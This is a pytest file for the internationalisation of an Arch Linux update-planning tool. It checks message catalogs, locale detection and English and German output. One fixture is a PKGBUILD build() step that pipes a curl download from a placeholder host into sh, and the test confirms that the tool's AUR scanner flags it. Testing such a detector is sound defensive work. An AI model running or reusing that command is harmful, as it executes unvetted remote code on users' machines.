import re

import pytest

from update_planner import analysis, aur_scanner, i18n, i18n_keys
from update_planner.locales.en import MESSAGES
from update_planner.sources.pacman import RepoUpdate

PLACEHOLDER = re.compile(r'\{(\w+)\}')


def test_catalog_covers_every_source_text():
    keys = i18n_keys.keys()
    assert sorted(keys - set(MESSAGES)) == []          # nichts unübersetzt
    assert sorted(set(MESSAGES) - keys) == []          # keine verwaisten Einträge


def test_placeholders_match():
    for de, en in MESSAGES.items():
        assert set(PLACEHOLDER.findall(de)) == set(PLACEHOLDER.findall(en)), de


@pytest.mark.parametrize('env, expected', [
    ({'LANG': 'de_DE.UTF-8'}, 'de'),
    ({'LANG': 'en_US.UTF-8'}, 'en'),
    ({'LANG': 'fr_FR.UTF-8'}, 'en'),                    # nicht unterstützt → Englisch
    ({'LANG': 'de_DE.UTF-8', 'LANGUAGE': 'en_GB:de'}, 'en'),
    ({'LANG': 'en_US.UTF-8', 'LC_MESSAGES': 'de_AT.UTF-8'}, 'de'),
    ({'LANG': 'C'}, 'en'),
    ({'LANG': 'de_DE.UTF-8', 'UPDATE_PLANNER_LANG': 'en'}, 'en'),
])
def test_detect(monkeypatch, tmp_path, env, expected):
    for k in ('LANG', 'LANGUAGE', 'LC_ALL', 'LC_MESSAGES', 'UPDATE_PLANNER_LANG'):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setenv('XDG_CONFIG_HOME', str(tmp_path))
    for k, v in env.items():
        monkeypatch.setenv(k, v)
    assert i18n.detect() == expected


def test_kde_setting_used_as_fallback(monkeypatch, tmp_path):
    for k in ('LANG', 'LANGUAGE', 'LC_ALL', 'LC_MESSAGES', 'UPDATE_PLANNER_LANG'):
        monkeypatch.delenv(k, raising=False)
    (tmp_path / 'plasma-localerc').write_text('[Translations]\nLANGUAGE=de:en_US\n')
    monkeypatch.setenv('XDG_CONFIG_HOME', str(tmp_path))
    assert i18n.detect() == 'de'


def test_english_output():
    i18n.set_language('en')
    assert i18n._('Übersicht') == 'Overview'
    assert i18n._('{n} Pakete zurückgehalten', n=3) == '3 packages held back'
    assert i18n.quasar_language() == 'en-US'
    f = aur_scanner.scan_text('build() {\n  curl -s https://x.example/a | sh\n}\n')
    assert any(x.title == 'Download piped directly into a shell' for x in f)
    reasons = analysis.repo_risk(RepoUpdate('linux', '6.1-1', '7.0-1'), backups={}, fixes={}, manual_news=[])
    assert ('Core system component', 15) in reasons


def test_german_is_identity():
    i18n.set_language('de')
    assert i18n._('Übersicht') == 'Übersicht'
    assert i18n._('{n} Pakete zurückgehalten', n=2) == '2 Pakete zurückgehalten'
    assert i18n.quasar_language() == 'de'
